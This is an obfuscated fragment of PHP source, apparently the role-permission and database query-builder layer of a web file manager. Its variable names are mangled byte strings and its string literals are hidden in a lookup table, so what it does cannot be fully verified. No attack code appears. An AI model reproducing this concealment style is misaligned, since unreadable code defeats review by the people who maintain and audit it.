self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($éó¯Ö‘é, $äçŞ˜•ô); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ãÑæÖ£ì =& $_SERVER[ˆûùúÊ¯]; $«äı—¬õ = parent::listData(); $˜¥ô‹ƒ‘ = !1; foreach ($«äı—¬õ as $“—Šñ·—) { if ($“—Šñ·—[$ãÑæÖ£ì[463]] <= 0 || $“—Šñ·—[$ãÑæÖ£ì[1918]] == $ãÑæÖ£ì[221]) { continue; } if (!$˜¥ô‹ƒ‘) { $˜¥ô‹ƒ‘ = $“—Šñ·—; continue; } if ($˜¥ô‹ƒ‘[$ãÑæÖ£ì[463]] > $“—Šñ·—[$ãÑæÖ£ì[463]]) { $˜¥ô‹ƒ‘ = $“—Šñ·—; } } return $˜¥ô‹ƒ‘ ? $˜¥ô‹ƒ‘[$ãÑæÖ£ì[451]] : $ãÑæÖ£ì[12]; } public function listData($£’Œ½“ = false, $û¥öÅ€ = "\163\157\x72\x74", $ÚÅß»à¹ = false) { return parent::listData($£’Œ½“, $û¥öÅ€, $ÚÅß»à¹); } public function update($Ÿù¾·÷®, $¬˜Ğçí¾) { $¥İİÏÇá =& $_SERVER[ˆûùúÊ¯]; $øØçõÕ– = parent::listData($Ÿù¾·÷®); $Ìñ‘ã“Å = $this->findByName($¬˜Ğçí¾[$¥İİÏÇá[42]]); if (!$øØçõÕ– || $Ìñ‘ã“Å && $Ìñ‘ã“Å[$¥İİÏÇá[451]] != $øØçõÕ–[$¥İİÏÇá[451]]) { return !1; } $this->filterAuth($¬˜Ğçí¾[$¥İİÏÇá[463]]); return parent::update($Ÿù¾·÷®, $¬˜Ğçí¾); } public function remove($À¶¦‹§‹) { $­àÙµ¿ = parent::listData($À¶¦‹§‹); if (!$­àÙµ¿ || $­àÙµ¿[$_SERVER[ˆûùúÊ¯][188]]) { return !1; } return parent::remove($À¶¦‹§‹); } public function add($ºŸ±­â– = array()) { $Üæ¥î×á =& $_SERVER[ˆûùúÊ¯]; if ($this->findByName($ºŸ±­â–[$Üæ¥î×á[42]])) { return !1; } $»À©•ÆÄ = array($Üæ¥î×á[42] => $Üæ¥î×á[12], $Üæ¥î×á[463] => 1, $Üæ¥î×á[1919] => $Üæ¥î×á[1906], $Üæ¥î×á[1918] => 1, $Üæ¥î×á[188] => 0, $Üæ¥î×á[1920] => 0); $ºŸ±­â– = array_merge($»À©•ÆÄ, $ºŸ±­â–); $ºŸ±­â–[$Üæ¥î×á[1920]] = $this->getSort(); $this->filterAuth($ºŸ±­â–[$Üæ¥î×á[463]]); return parent::insert($ºŸ±­â–); } private function getSort() { $Ö§Á¤Œ =& $_SERVER[ˆûùúÊ¯]; $à„åÛã = parent::listData(); $ä”Í§÷ = array_to_keyvalue($à„åÛã, $Ö§Á¤Œ[12], $Ö§Á¤Œ[1920]); return empty($ä”Í§÷) ? 0 : max($ä”Í§÷) + 1; } private function filterAuth(&$Ïä§İ¾³) { if (!$Ïä§İ¾³) { return; } $ôÔ™øˆ’ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $åşÛ«êÀ = array(); foreach ($ôÔ™øˆ’ as $èò÷ğû) { if ($Ïä§İ¾³ & $èò÷ğû) { $åşÛ«êÀ[] = $èò÷ğû; } } if (in_array(self::AUTH_ROOT, $åşÛ«êÀ)) { $Ïä§İ¾³ = array_sum($ôÔ™øˆ’); return; } $¶şì = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($åşÛ«êÀ as $èò÷ğû) { if (isset($¶şì[$èò÷ğû])) { $åşÛ«êÀ = array_merge($åşÛ«êÀ, $¶şì[$èò÷ğû]); } } $åşÛ«êÀ[] = self::AUTH_SHOW; $Ïä§İ¾³ = array_sum(array_unique($åşÛ«êÀ)); } public function sort($ÇÓª¯½», $Ì•¨úÃ¸) { return parent::update($ÇÓª¯½», $Ì•¨úÃ¸); } } goto fê‰ÚˆÍäƒ; cå»ÁàÃ†: class DbSqlite3 extends DbSqlite3Base { public function query($ÖÒñ½‰ö) { $ÚÖ¹ïöê =& $_SERVER[ˆûùúÊ¯]; if (!CacheLock::fileLock($ÚÖ¹ïöê[23])) { return !1; } $Øê’û¯ã = parent::query($ÖÒñ½‰ö); CacheLock::fileUnLock($ÚÖ¹ïöê[23]); return $Øê’û¯ã; } public function execute($Š±íÙ¸) { $çœŒ ò¿ =& $_SERVER[ˆûùúÊ¯]; if (!CacheLock::fileLock($çœŒ ò¿[23])) { return !1; } $™Œœ÷¼Ä = parent::execute($Š±íÙ¸); CacheLock::fileUnLock($çœŒ ò¿[23]); return $™Œœ÷¼Ä; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\x69\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\75", "\156\145\161" => "\74\76", "\x67\x74" => "\x3e", "\145\x67\x74" => "\76\75", "\x6c\x74" => "\74", "\145\154\164" => "\74\75", "\156\x6f\x74\154\x69\x6b\145" => "\116\x4f\124\40\114\x49\113\x45", "\154\x69\x6b\x65" => "\114\111\113\x45", "\x69\156" => "\x49\x4e", "\156\157\164\x69\156" => "\x4e\x4f\x54\x20\x49\x4e", "\156\157\x74\40\151\x6e" => "\x4e\x4f\x54\x20\111\116", "\142\x65\x74\x77\145\x65\x6e" => "\102\x45\124\x57\105\x45\x4e", "\x6e\x6f\x74\x62\x65\x74\167\145\145\x6e" => "\116\117\x54\40\x42\105\124\127\105\105\116", "\x6e\x6f\x74\40\142\x65\164\x77\x65\x65\x6e" => "\x4e\x4f\x54\40\102\x45\124\127\105\x45\x4e"); protected $selectSql = "\123\105\114\x45\x43\124\45\104\x49\123\124\x49\116\103\124\x25\40\45\106\111\x45\x4c\x44\45\x20\x46\122\x4f\115\x20\45\x54\101\x42\x4c\105\45\x25\x4a\117\111\x4e\x25\x25\x57\110\x45\122\x45\45\45\x47\122\x4f\125\x50\x25\45\x48\101\126\111\116\x47\x25\45\117\x52\104\105\122\x25\45\114\111\x4d\111\x54\x25\x20\x25\x55\116\111\x4f\x4e\x25\45\x43\x4f\115\x4d\105\116\124\x25"; protected $bind = array(); public static function getInstance() { $î÷åÏî = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ˆûùúÊ¯][1021], $î÷åÏî); } public function factory($ê‡‘öïÏ = '') { $åâçë÷ =& $_SERVER[ˆûùúÊ¯]; $ê‡‘öïÏ = $this->parseConfig($ê‡‘öïÏ); if (empty($ê‡‘öïÏ[$åâçë÷[1022]])) { think_exception(think_lang($åâçë÷[1023])); } $this->dbType = ucwords(strtolower($ê‡‘öïÏ[$åâçë÷[1022]])); $Øê¶‘‰• = $åâçë÷[1024] . $this->dbType; if (class_exists($Øê¶‘‰•)) { $™şöºë¹ = new $Øê¶‘‰•($ê‡‘öïÏ); if ($åâçë÷[1025] != strtolower($ê‡‘öïÏ[$åâçë÷[1022]])) { $™şöºë¹->dbType = strtoupper($this->dbType); } else { $™şöºë¹->dbType = $this->_getDsnType($ê‡‘öïÏ[$åâçë÷[977]]); } } else { think_exception(think_lang($åâçë÷[1026]) . $åâçë÷[1027] . $Øê¶‘‰•); } return $™şöºë¹; } public function __call($ß¥”„§, $ü‰ƒâ©ß) { if (method_exists($this, $ß¥”„§)) { return call_user_func_array(array($this, $ß¥”„§), $ü‰ƒâ©ß); } } protected function _getDsnType($…µïîåÜ) { $÷¥Ò¡‚ç = explode($_SERVER[ˆûùúÊ¯][4], $…µïîåÜ); $©éÆíï» = strtoupper(trim($÷¥Ò¡‚ç[0])); return $©éÆíï»; } private function parseConfig($Ù³½ø¯Å = '') { $şŒŠ‹À» =& $_SERVER[ˆûùúÊ¯]; if (!empty($Ù³½ø¯Å) && is_string($Ù³½ø¯Å)) { $Ù³½ø¯Å = $this->parseDSN($Ù³½ø¯Å); } elseif (is_array($Ù³½ø¯Å)) { $Ù³½ø¯Å = array_change_key_case($Ù³½ø¯Å); $Ù³½ø¯Å = array($şŒŠ‹À»[1022] => $Ù³½ø¯Å[$şŒŠ‹À»[1028]], $şŒŠ‹À»[949] => $Ù³½ø¯Å[$şŒŠ‹À»[1029]], $şŒŠ‹À»[950] => $Ù³½ø¯Å[$şŒŠ‹À»[1030]], $şŒŠ‹À»[947] => $Ù³½ø¯Å[$şŒŠ‹À»[1031]], $şŒŠ‹À»[948] => $Ù³½ø¯Å[$şŒŠ‹À»[1032]], $şŒŠ‹À»[31] => $Ù³½ø¯Å[$şŒŠ‹À»[1033]], $şŒŠ‹À»[977] => $Ù³½ø¯Å[$şŒŠ‹À»[1034]], $şŒŠ‹À»[27] => isset($Ù³½ø¯Å[$şŒŠ‹À»[1035]]) ? $Ù³½ø¯Å[$şŒŠ‹À»[1035]] : array()); } elseif (empty($Ù³½ø¯Å)) { if (think_config($şŒŠ‹À»[1036]) && $şŒŠ‹À»[1025] != strtolower(think_config($şŒŠ‹À»[1037]))) { $Ù³½ø¯Å = $this->parseDSN(think_config($şŒŠ‹À»[1036])); } else { $Ù³½ø¯Å = array($şŒŠ‹À»[1022] => think_config($şŒŠ‹À»[1037]), $şŒŠ‹À»[949] => think_config($şŒŠ‹À»[1038]), $şŒŠ‹À»[950] => think_config($şŒŠ‹À»[1039]), $şŒŠ‹À»[947] => think_config($şŒŠ‹À»[1040]), $şŒŠ‹À»[948] => think_config($şŒŠ‹À»[1041]), $şŒŠ‹À»[31] => think_config($şŒŠ‹À»[298]), $şŒŠ‹À»[977] => think_config($şŒŠ‹À»[1036]), $şŒŠ‹À»[27] => think_config($şŒŠ‹À»[1042])); } } return $Ù³½ø¯Å; } protected function initConnect($íÄÎŠæù = true) { if (1 == think_config($_SERVER[ˆûùúÊ¯][32])) { $this->_linkID = $this->multiConnect($íÄÎŠæù); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $·”õá¢æ => $á‡Çè±) { $this->_linkID = $á‡Çè±; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ÔâÀê„µ = false) { $é’¿ù¨ø =& $_SERVER[ˆûùúÊ¯]; static $Ë£˜ªÌÈ = array(); static $‘  ‚· = -1; if (empty($Ë£˜ªÌÈ)) { foreach ($this->config as $¾ı»­å° => $Š¦œÆùè) { $Ë£˜ªÌÈ[$¾ı»­å°] = explode($é’¿ù¨ø[60], $Š¦œÆùè); } } if (think_config($é’¿ù¨ø[1043])) { if ($ÔâÀê„µ || think_config($é’¿ù¨ø[447]) === !0) { $«³ßšÆú = floor(mt_rand(0, think_config($é’¿ù¨ø[1044]) - 1)); $‘  ‚· = $«³ßšÆú; } else { if (is_numeric(think_config($é’¿ù¨ø[1045]))) { $«³ßšÆú = think_config($é’¿ù¨ø[1045]); } else { $«³ßšÆú = floor(mt_rand(think_config($é’¿ù¨ø[1044]), count($Ë£˜ªÌÈ[$é’¿ù¨ø[947]]) - 1)); } } } else { $«³ßšÆú = floor(mt_rand(0, count($Ë£˜ªÌÈ[$é’¿ù¨ø[947]]) - 1)); $‘  ‚· = $«³ßšÆú; } $«³ßšÆú = $‘  ‚· !== -1 ? $‘  ‚· : $«³ßšÆú; $µòè­Ï = array($é’¿ù¨ø[949] => isset($Ë£˜ªÌÈ[$é’¿ù¨ø[949]][$«³ßšÆú]) ? $Ë£˜ªÌÈ[$é’¿ù¨ø[949]][$«³ßšÆú] : $Ë£˜ªÌÈ[$é’¿ù¨ø[949]][0], $é’¿ù¨ø[950] => isset($Ë£˜ªÌÈ[$é’¿ù¨ø[950]][$«³ßšÆú]) ? $Ë£˜ªÌÈ[$é’¿ù¨ø[950]][$«³ßšÆú] : $Ë£˜ªÌÈ[$é’¿ù¨ø[950]][0], $é’¿ù¨ø[947] => isset($Ë£˜ªÌÈ[$é’¿ù¨ø[947]][$«³ßšÆú]) ? $Ë£˜ªÌÈ[$é’¿ù¨ø[947]][$«³ßšÆú] : $Ë£˜ªÌÈ[$é’¿ù¨ø[947]][0], $é’¿ù¨ø[948] => isset($Ë£˜ªÌÈ[$é’¿ù¨ø[948]][$«³ßšÆú]) ? $Ë£˜ªÌÈ[$é’¿ù¨ø[948]][$«³ßšÆú] : $Ë£˜ªÌÈ[$é’¿ù¨ø[948]][0], $é’¿ù¨ø[31] => isset($Ë£˜ªÌÈ[$é’¿ù¨ø[31]][$«³ßšÆú]) ? $Ë£˜ªÌÈ[$é’¿ù¨ø[31]][$«³ßšÆú] : $Ë£˜ªÌÈ[$é’¿ù¨ø[31]][0], $é’¿ù¨ø[977] => isset($Ë£˜ªÌÈ[$é’¿ù¨ø[977]][$«³ßšÆú]) ? $Ë£˜ªÌÈ[$é’¿ù¨ø[977]][$«³ßšÆú] : $Ë£˜ªÌÈ[$é’¿ù¨ø[977]][0], $é’¿ù¨ø[27] => isset($Ë£˜ªÌÈ[$é’¿ù¨ø[27]][$«³ßšÆú]) ? $Ë£˜ªÌÈ[$é’¿ù¨ø[27]][$«³ßšÆú] : $Ë£˜ªÌÈ[$é’¿ù¨ø[27]][0]); return $this->connect($µòè­Ï, $«³ßšÆú); } public function parseDSN($ìüÒ²€Š) { $Œç½šê¨ =& $_SERVER[ˆûùúÊ¯]; if (empty($ìüÒ²€Š)) { return !1; } $íıø§¯ = parse_url($ìüÒ²€Š); if ($íıø§¯[$Œç½šê¨[204]]) { $Ó‘Œ¦ = array($Œç½šê¨[1022] => $íıø§¯[$Œç½šê¨[204]], $Œç½šê¨[949] => isset($íıø§¯[$Œç½šê¨[638]]) ? $íıø§¯[$Œç½šê¨[638]] : $Œç½šê¨[12], $Œç½šê¨[950] => isset($íıø§¯[$Œç½šê¨[1046]]) ? $íıø§¯[$Œç½šê¨[1046]] : $Œç½šê¨[12], $Œç½šê¨[947] => isset($íıø§¯[$Œç½šê¨[205]]) ? $íıø§¯[$Œç½šê¨[205]] : $Œç½šê¨[12], $Œç½šê¨[948] => isset($íıø§¯[$Œç½šê¨[206]]) ? $íıø§¯[$Œç½šê¨[206]] : $Œç½šê¨[12], $Œç½šê¨[31] => isset($íıø§¯[$Œç½šê¨[94]]) ? substr($íıø§¯[$Œç½šê¨[94]], 1) : $Œç½šê¨[12]); } else { preg_match($Œç½šê¨[1047], trim($ìüÒ²€Š), $õ”¾£Ø¿); $Ó‘Œ¦ = array($Œç½šê¨[1022] => $õ”¾£Ø¿[1], $Œç½šê¨[949] => $õ”¾£Ø¿[2], $Œç½šê¨[950] => $õ”¾£Ø¿[3], $Œç½šê¨[947] => $õ”¾£Ø¿[4], $Œç½šê¨[948] => $õ”¾£Ø¿[5], $Œç½šê¨[31] => $õ”¾£Ø¿[6]); } $Ó‘Œ¦[$Œç½šê¨[977]] = $Œç½šê¨[12]; return $Ó‘Œ¦; } protected function debug() { $ø¹¿ßŒ =& $_SERVER[ˆûùúÊ¯]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ø¹¿ßŒ[1048]; if (think_config($ø¹¿ßŒ[1049])) { think_status($ø¹¿ßŒ[1050]); think_trace($this->queryStr . $ø¹¿ßŒ[1051] . think_status($ø¹¿ßŒ[34], $ø¹¿ßŒ[1050], 6) . $ø¹¿ßŒ[1052], $ø¹¿ßŒ[12], $ø¹¿ßŒ[1053]); } } protected function parseLock($ÀÜ¨ä© = false) { $…Š¨ÚĞ• =& $_SERVER[ˆûùúÊ¯]; if (!$ÀÜ¨ä©) { return $…Š¨ÚĞ•[12]; } if ($…Š¨ÚĞ•[979] == $this->dbType) { return $…Š¨ÚĞ•[1054]; } return $…Š¨ÚĞ•[1055]; } protected function parseSet($Š§Öƒô) { $Á‡³çâÛ =& $_SERVER[ˆûùúÊ¯]; foreach ($Š§Öƒô as $Ã°Óƒšµ => $ìÛÒş¾‰) { if (is_array($ìÛÒş¾‰) && $Á‡³çâÛ[349] == $ìÛÒş¾‰[0]) { $ŠÜóùùˆ[] = $this->parseKey($Ã°Óƒšµ) . $Á‡³çâÛ[945] . $ìÛÒş¾‰[1]; } elseif (is_scalar($ìÛÒş¾‰) || is_null($ìÛÒş¾‰)) { $ŠÜóùùˆ[] = $this->parseKey($Ã°Óƒšµ) . $Á‡³çâÛ[945] . $this->parseValue($ìÛÒş¾‰); } } return $Á‡³çâÛ[1056] . implode($Á‡³çâÛ[60], $ŠÜóùùˆ); } protected function bindParam($×¡ÀÚÇ, $¸éŒÁï) { $this->bind[$_SERVER[ˆûùúÊ¯][4] . $×¡ÀÚÇ] = $¸éŒÁï; } protected function parseBind($–È·èÚ) { $–È·èÚ = array_merge($this->bind, $–È·èÚ); $this->bind = array(); return $–È·èÚ; } function parseKey(&$õ§¡Öİñ, $¤óÂÂ€‚ = true) { if ($¤óÂÂ€‚) { $õ§¡Öİñ = $this->parseKeyCheck($õ§¡Öİñ); } return $õ§¡Öİñ; } function parseKeyCheck($ö¸ê¨ï) { $¸Éğ¶¾Ñ =& $_SERVER[ˆûùúÊ¯]; $ö¸ê¨ï = trim($ö¸ê¨ï); if (!preg_match($¸Éğ¶¾Ñ[1057], $ö¸ê¨ï)) { think_exception($¸Éğ¶¾Ñ[1058] . $ö¸ê¨ï); } return $ö¸ê¨ï; } protected function parseValue($éËÓÀÏ«) { $Â£ÄÇ·× =& $_SERVER[ˆûùúÊ¯]; if (is_string($éËÓÀÏ«)) { $éËÓÀÏ« = $Â£ÄÇ·×[1018] . $this->escapeString($éËÓÀÏ«) . $Â£ÄÇ·×[1018]; } elseif (isset($éËÓÀÏ«[0]) && is_string($éËÓÀÏ«[0]) && strtolower($éËÓÀÏ«[0]) == $Â£ÄÇ·×[349]) { $éËÓÀÏ« = $this->escapeString($éËÓÀÏ«[1]); } elseif (is_array($éËÓÀÏ«)) { $éËÓÀÏ« = array_map(array($this, $Â£ÄÇ·×[1019]), $éËÓÀÏ«); } elseif (is_bool($éËÓÀÏ«)) { $éËÓÀÏ« = $éËÓÀÏ« ? $Â£ÄÇ·×[98] : $Â£ÄÇ·×[221]; } elseif (is_null($éËÓÀÏ«)) { $éËÓÀÏ« = $Â£ÄÇ·×[113]; } return $éËÓÀÏ«; } protected function parseField($’ğË¢”Ì) { $²³¨À‹Š =& $_SERVER[ˆûùúÊ¯]; if (is_string($’ğË¢”Ì) && strpos($’ğË¢”Ì, $²³¨À‹Š[60])) { $’ğË¢”Ì = explode($²³¨À‹Š[60], $’ğË¢”Ì); } if (is_array($’ğË¢”Ì)) { $ëáÁ°æ = array(); foreach ($’ğË¢”Ì as $¹ò“«Òä => $”ÎíÍ‚‚) { if (!is_numeric($¹ò“«Òä)) { $ëáÁ°æ[] = $this->parseKey($¹ò“«Òä, !1) . $²³¨À‹Š[1059] . $this->parseKey($”ÎíÍ‚‚); } else { $ëáÁ°æ[] = $this->parseKey($”ÎíÍ‚‚); } } $Îè«¡µÙ = implode($²³¨À‹Š[60], $ëáÁ°æ); } elseif (is_string($’ğË¢”Ì) && !empty($’ğË¢”Ì)) { $Îè«¡µÙ = $’ğË¢”Ì; } else { $Îè«¡µÙ = $²³¨À‹Š[212]; } return $Îè«¡µÙ; } protected function parseTable($œèÅß) { $³±ˆ¸¼ı =& $_SERVER[ˆûùúÊ¯]; if (is_array($œèÅß)) { $æüØäÇì = array(); foreach ($œèÅß as $Ø¼Œâíá => $À‰ôâáÓ) { if (!is_numeric($Ø¼Œâíá)) { $æüØäÇì[] = $this->parseKey($Ø¼Œâíá) . $³±ˆ¸¼ı[63] . $this->parseKey($À‰ôâáÓ); } else { $æüØäÇì[] = $this->parseKey($Ø¼Œâíá); } } $œèÅß = $æüØäÇì; } elseif (is_string($œèÅß)) { if (strstr($œèÅß, $³±ˆ¸¼ı[63])) { return $œèÅß; } $œèÅß = explode($³±ˆ¸¼ı[60], $œèÅß); array_walk($œèÅß, array($this, $³±ˆ¸¼ı[967])); } return $³±ˆ¸¼ı[961] . trim(implode($³±ˆ¸¼ı[1060], $œèÅß), $³±ˆ¸¼ı[437]) . $³±ˆ¸¼ı[961]; } protected function parseWhere($‰®¸šë’) { $ÑòÏ”î¹ =& $_SERVER[ˆûùúÊ¯]; $ıÀµ³áÁ = $ÑòÏ”î¹[12]; if (is_string($‰®¸šë’)) { $ıÀµ³áÁ = $‰®¸šë’; } else { $¦Ç•ÁÒ = isset($‰®¸šë’[$ÑòÏ”î¹[1061]]) ? strtoupper($‰®¸šë’[$ÑòÏ”î¹[1061]]) : $ÑòÏ”î¹[12]; if (in_array($¦Ç•ÁÒ, array($ÑòÏ”î¹[1062], $ÑòÏ”î¹[1063], $ÑòÏ”î¹[1064]))) { $¦Ç•ÁÒ = $ÑòÏ”î¹[63] . $¦Ç•ÁÒ . $ÑòÏ”î¹[63]; unset($‰®¸šë’[$ÑòÏ”î¹[1061]]); } else { $¦Ç•ÁÒ = $ÑòÏ”î¹[1065]; } foreach ($‰®¸šë’ as $ÏÄ¹ºµÂ => $¤ÉÚ™ñ‚) { $ıÀµ³áÁ .= $ÑòÏ”î¹[329]; if (is_numeric($ÏÄ¹ºµÂ)) { $ÏÄ¹ºµÂ = $ÑòÏ”î¹[1066]; } if (0 === strpos($ÏÄ¹ºµÂ, $ÑòÏ”î¹[11])) { $ıÀµ³áÁ .= $this->parseThinkWhere($ÏÄ¹ºµÂ, $¤ÉÚ™ñ‚); } else { if (!preg_match($ÑòÏ”î¹[1067], trim($ÏÄ¹ºµÂ))) { think_exception(think_lang($ÑòÏ”î¹[1068]) . $ÑòÏ”î¹[4] . $ÏÄ¹ºµÂ); } $¸“¯Çû = is_array($¤ÉÚ™ñ‚) && isset($¤ÉÚ™ñ‚[$ÑòÏ”î¹[1069]]); $ÏÄ¹ºµÂ = trim($ÏÄ¹ºµÂ); if (strpos($ÏÄ¹ºµÂ, $ÑòÏ”î¹[335])) { $Û „À¿€ = explode($ÑòÏ”î¹[335], $ÏÄ¹ºµÂ); $Æ“á–ÍŒ = array(); foreach ($Û „À¿€ as $è—úùÛÈ => $…ÜğéÏ) { $×ÑßÅâ´ = $¸“¯Çû ? $¤ÉÚ™ñ‚[$è—úùÛÈ] : $¤ÉÚ™ñ‚; $Æ“á–ÍŒ[] = $ÑòÏ”î¹[312] . $this->parseWhereItem($this->parseKey($…ÜğéÏ), $×ÑßÅâ´) . $ÑòÏ”î¹[966]; } $ıÀµ³áÁ .= implode($ÑòÏ”î¹[1070], $Æ“á–ÍŒ); } elseif (strpos($ÏÄ¹ºµÂ, $ÑòÏ”î¹[336])) { $Û „À¿€ = explode($ÑòÏ”î¹[336], $ÏÄ¹ºµÂ); $Æ“á–ÍŒ = array(); foreach ($Û „À¿€ as $è—úùÛÈ => $…ÜğéÏ) { $×ÑßÅâ´ = $¸“¯Çû ? $¤ÉÚ™ñ‚[$è—úùÛÈ] : $¤ÉÚ™ñ‚; $Æ“á–ÍŒ[] = $ÑòÏ”î¹[312] . $this->parseWhereItem($this->parseKey($…ÜğéÏ), $×ÑßÅâ´) . $ÑòÏ”î¹[966]; } $ıÀµ³áÁ .= implode($ÑòÏ”î¹[1065], $Æ“á–ÍŒ); } else { $ıÀµ³áÁ .= $this->parseWhereItem($this->parseKey($ÏÄ¹ºµÂ), $¤ÉÚ™ñ‚); } } $ıÀµ³áÁ .= $ÑòÏ”î¹[330] . $¦Ç•ÁÒ; } $ıÀµ³áÁ = substr($ıÀµ³áÁ, 0, -strlen($¦Ç•ÁÒ)); } return empty($ıÀµ³áÁ) ? $ÑòÏ”î¹[12] : $ÑòÏ”î¹[1071] . $ıÀµ³áÁ; } protected function parseWhereItem($á‘¸Š‰ñ, $é¢•‘ú›) { $šÀñìäÎ =& $_SERVER[ˆûùúÊ¯]; $„ĞúÔŠŒ = $šÀñìäÎ[12]; if (is_array($é¢•‘ú›)) { if (is_string($é¢•‘ú›[0])) { $à¤£¨êé = strtolower($é¢•‘ú›[0]); if (in_array($é¢•‘ú›[0], array($šÀñìäÎ[945], $šÀñìäÎ[1072], $šÀñìäÎ[1073], $šÀñìäÎ[1074], $šÀñìäÎ[1075], $šÀñìäÎ[1076]))) { $„ĞúÔŠŒ .= $á‘¸Š‰ñ . $šÀñìäÎ[63] . $é¢•‘ú›[0] . $šÀñìäÎ[63] . $this->parseValue($é¢•‘ú›[1]); } elseif (preg_match($šÀñìäÎ[1077], $é¢•‘ú›[0])) { $„ĞúÔŠŒ .= $á‘¸Š‰ñ . $šÀñìäÎ[63] . $this->exp[$à¤£¨êé] . $šÀñìäÎ[63] . $this->parseValue($é¢•‘ú›[1]); } elseif (preg_match($šÀñìäÎ[1078], $é¢•‘ú›[0])) { if (is_array($é¢•‘ú›[1])) { $‰‚¹‡ = isset($é¢•‘ú›[2]) ? strtoupper($é¢•‘ú›[2]) : $šÀñìäÎ[1063]; if (in_array($‰‚¹‡, array($šÀñìäÎ[1062], $šÀñìäÎ[1063], $šÀñìäÎ[1064]))) { $ªŠ±• = array(); foreach ($é¢•‘ú›[1] as $¥™×È­Õ) { $ªŠ±•[] = $á‘¸Š‰ñ . $šÀñìäÎ[63] . $this->exp[$à¤£¨êé] . $šÀñìäÎ[63] . $this->parseValue($¥™×È­Õ); } $„ĞúÔŠŒ .= $šÀñìäÎ[312] . implode($šÀñìäÎ[63] . $‰‚¹‡ . $šÀñìäÎ[63], $ªŠ±•) . $šÀñìäÎ[966]; } } else { $„ĞúÔŠŒ .= $á‘¸Š‰ñ . $šÀñìäÎ[63] . $this->exp[$à¤£¨êé] . $šÀñìäÎ[63] . $this->parseValue($é¢•‘ú›[1]); } } elseif ($šÀñìäÎ[349] == $à¤£¨êé) { $„ĞúÔŠŒ .= $šÀñìäÎ[964] . $á‘¸Š‰ñ . $šÀñìäÎ[63] . $é¢•‘ú›[1] . $šÀñìäÎ[1079]; } elseif (preg_match($šÀñìäÎ[1080], $é¢•‘ú›[0])) { $„ĞúÔŠŒ .= $é¢•‘ú›[0]; } elseif (preg_match($šÀñìäÎ[1081], $é¢•‘ú›[0])) { if (isset($é¢•‘ú›[2]) && $šÀñìäÎ[349] == $é¢•‘ú›[2]) { $„ĞúÔŠŒ .= $á‘¸Š‰ñ . $šÀñìäÎ[63] . $this->exp[$à¤£¨êé] . $šÀñìäÎ[63] . $é¢•‘ú›[1]; } else { if (is_string($é¢•‘ú›[1])) { $é¢•‘ú›[1] = explode($šÀñìäÎ[60], $é¢•‘ú›[1]); } $Øé‚ÀÄÀ = implode($šÀñìäÎ[60], $this->parseValue($é¢•‘ú›[1])); $„ĞúÔŠŒ .= $á‘¸Š‰ñ . $šÀñìäÎ[63] . $this->exp[$à¤£¨êé] . $šÀñìäÎ[964] . $Øé‚ÀÄÀ . $šÀñìäÎ[966]; } } elseif (preg_match($šÀñìäÎ[1082], $é¢•‘ú›[0])) { $ìÄ°Õ®® = is_string($é¢•‘ú›[1]) ? explode($šÀñìäÎ[60], $é¢•‘ú›[1]) : $é¢•‘ú›[1]; $„ĞúÔŠŒ .= $šÀñìäÎ[964] . $á‘¸Š‰ñ . $šÀñìäÎ[63] . $this->exp[$à¤£¨êé] . $šÀñìäÎ[63] . $this->parseValue($ìÄ°Õ®®[0]) . $šÀñìäÎ[1065] . $this->parseValue($ìÄ°Õ®®[1]) . $šÀñìäÎ[330]; } else { think_exception(think_lang($šÀñìäÎ[1068]) . $šÀñìäÎ[4] . $é¢•‘ú›[0]); } } else { $¦…ïÚ = count($é¢•‘ú›); $€»©™’… = $šÀñìäÎ[12]; if (is_string($é¢•‘ú›[$¦…ïÚ - 1])) { $€»©™’… = isset($é¢•‘ú›[$¦…ïÚ - 1]) ? strtoupper($é¢•‘ú›[$¦…ïÚ - 1]) : $šÀñìäÎ[12]; if (in_array($€»©™’…, array($šÀñìäÎ[1062], $šÀñìäÎ[1063], $šÀñìäÎ[1064]))) { $¦…ïÚ = $¦…ïÚ - 1; } } else { $€»©™’… = $šÀñìäÎ[1062]; } for ($øğ€ÛÄı = 0; $øğ€ÛÄı < $¦…ïÚ; $øğ€ÛÄı++) { $ìÄ°Õ®® = is_array($é¢•‘ú›[$øğ€ÛÄı]) ? $é¢•‘ú›[$øğ€ÛÄı][1] : $é¢•‘ú›[$øğ€ÛÄı]; if ($šÀñìäÎ[349] == strtolower($é¢•‘ú›[$øğ€ÛÄı][0])) { $„ĞúÔŠŒ .= $šÀñìäÎ[312] . $á‘¸Š‰ñ . $šÀñìäÎ[63] . $ìÄ°Õ®® . $šÀñìäÎ[1079] . $€»©™’… . $šÀñìäÎ[63]; } else { $İÌïû‘¨ = is_array($é¢•‘ú›[$øğ€ÛÄı]) ? $this->exp[strtolower($é¢•‘ú›[$øğ€ÛÄı][0])] : $šÀñìäÎ[945]; if (!$İÌïû‘¨ && is_array($é¢•‘ú›[$øğ€ÛÄı]) && in_array($é¢•‘ú›[$øğ€ÛÄı][0], array($šÀñìäÎ[945], $šÀñìäÎ[1072], $šÀñìäÎ[1073], $šÀñìäÎ[1074], $šÀñìäÎ[1075], $šÀñìäÎ[1076]))) { 